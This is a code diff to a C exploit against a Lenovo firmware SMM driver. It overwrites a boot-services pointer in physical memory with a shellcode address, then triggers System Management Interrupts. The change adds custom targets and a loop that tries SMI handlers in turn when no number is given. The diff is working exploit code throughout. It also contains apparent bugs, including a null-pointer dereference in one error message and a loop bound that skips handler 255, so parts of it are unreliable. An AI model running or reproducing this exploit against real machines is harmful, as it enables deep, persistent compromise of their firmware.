@@ -55,26 +55,7 @@
         }
 */
 
-typedef struct _UEFI_EXPL_TARGET
-{
-    /*
-        Target address to overwrite (EFI_BOOT_SERVICES->LocateService field value)
-        with shellcode address.
-    */
-    unsigned long long addr; 
-
-    /*
-        Number of vulnerable SMI handler.
-    */
-    unsigned char smi_num;
-
-    /*
-        Target name and description.
-    */
-    const char *name;
-
-} UEFI_EXPL_TARGET,
-*PUEFI_EXPL_TARGET;
+#define MAX_SMI_NUM 0xff
 
 /*
     List of model and firmware version specific constants for different targets.
@@ -180,7 +161,7 @@ void expl_lenovo_SystemSmmAhciAspiLegacyRt_targets_info(void)
     }
 }
 //--------------------------------------------------------------------------------------
-bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER handler, void *context)
+bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, PUEFI_EXPL_TARGET custom_target, UEFI_EXPL_SMM_HANDLER handler, void *context)
 {
     bool ret = false;
     UEFI_EXPL_TARGET *expl_target = NULL;
@@ -189,16 +170,36 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
     smm_context.smi_count = 0;
     smm_context.user_handler = smm_context.user_context = 0;
 
-    if (target < 0 || target >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
+    if (custom_target == NULL)
     {
-        printf(__FUNCTION__"() ERROR: Invalid target number %d\n", target);
-        return false;
+        // use known target
+        if (target < 0 || target >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
+        {
+            printf(__FUNCTION__"() ERROR: Invalid target number %d\n", target);
+            return false;
+        }
+
+        // get target model information
+        expl_target = &g_targets[target];
+
+        printf("Using target \"%s\"\n", expl_target->name);
     }
+    else
+    {
+        if (custom_target->smi_num != -1 && custom_target->smi_num > MAX_SMI_NUM)
+        {
+            printf(__FUNCTION__"() ERROR: SMI handler number %d is invalid\n", expl_target->smi_num);
+            return false;
+        }
 
-    // get target model information
-    expl_target = &g_targets[target];
+        // use custom caller specified target
+        expl_target = custom_target;
 
-    printf("Using target \"%s\"\n", expl_target->name);
+        printf(
+            "Using custom target with EFI_BOOT_SERVICES.LocateProtocol field address 0x%llx\n", 
+            expl_target->addr
+        );
+    }
 
     if (handler)
     {
@@ -261,19 +262,43 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(int target, UEFI_EXPL_SMM_HANDLER han
                 // overwrite pointer value
                 if (uefi_expl_phys_mem_write(expl_target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
                 {
-                    printf("Generating SMI %d...\n", expl_target->smi_num);
+                    unsigned char smi_num = 0;
 
-                    if (!uefi_expl_smi_invoke(expl_target->smi_num))
+                    if (expl_target->smi_num != -1)
                     {
-                        printf(__FUNCTION__"() ERROR: uefi_expl_smi_invoke() fails\n");
+                        /*
+                            Use specific SMI handler, in other case -- try to exploit
+                            all of the SMI handlers from 0 to 255.
+                        */
+                        smi_num = (unsigned char)expl_target->smi_num;
                     }
 
-                    if (smm_context.smi_count > 0)
+                    while (smi_num < MAX_SMI_NUM)
                     {
-                        ret = true;
+                        printf("Generating SMI %d...\n", smi_num);
+
+                        if (uefi_expl_smi_invoke(smi_num))
+                        {
+                            if (smm_context.smi_count > 0)
+                            {
+                                ret = true;
+                            }
+
+                            printf(__FUNCTION__"(): Exploitation %s\n", ret ? "success" : "false");                            
+                        }
+                        else
+                        {
+                            printf(__FUNCTION__"() ERROR: uefi_expl_smi_invoke() fails\n");
+                        }                        
+
+                        if (expl_target->smi_num != -1 || ret)
+                        {
+                            break;
+                        }
+
+                        // check next SMI handler
+                        smi_num += 1;
                     }
-                    
-                    printf(__FUNCTION__"(): Exploitation %s\n", ret ? "success" : "false");                    
 
                     // restore overwritten value
                     uefi_expl_phys_mem_write(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val);
